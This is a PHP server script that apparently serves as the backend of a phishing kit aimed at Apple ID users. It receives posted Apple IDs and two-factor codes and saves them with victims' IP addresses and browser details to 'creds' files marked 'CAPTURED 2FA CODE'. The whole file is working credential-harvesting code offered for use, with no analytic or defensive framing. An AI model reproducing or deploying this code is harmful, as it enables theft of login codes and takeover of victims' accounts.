<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || empty($data['code'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing required fields']);
    exit;
}

$code = substr(preg_replace('/[^0-9]/', '', $data['code']), 0, 6);
$appleid = substr(trim($data['appleid'] ?? 'Unknown'), 0, 255);
$userAgent = substr($data['userAgent'] ?? 'Unknown', 0, 500);
$timestamp = $data['timestamp'] ?? 'Unknown';

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '-';
$method = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';

$credsDir = dirname(__DIR__) . '/creds';
if (!file_exists($credsDir)) {
    mkdir($credsDir, 0755, true);
}

$ts = date('Y-m-d_H-i-s');
$filename = $credsDir . '/2fa_code_' . $ts . '.txt';

$sep = str_repeat('═', 55);
$logEntry = <<<LOG
{$sep}
CAPTURED 2FA CODE
{$sep}
Timestamp:    {$ts}
2FA Code:     {$code}
Apple ID:     {$appleid}
IP Address:   {$ip}
X-Forwarded:  {$forwarded}
User-Agent:   {$userAgent}
Method:       {$method}
{$sep}

LOG;

file_put_contents($filename, $logEntry);
file_put_contents($credsDir . '/all_2fa_codes.log', $logEntry, FILE_APPEND);

error_log("ICFISH 2FA | {$ip} | {$code} | {$appleid}");

echo json_encode(['status' => 'success']);
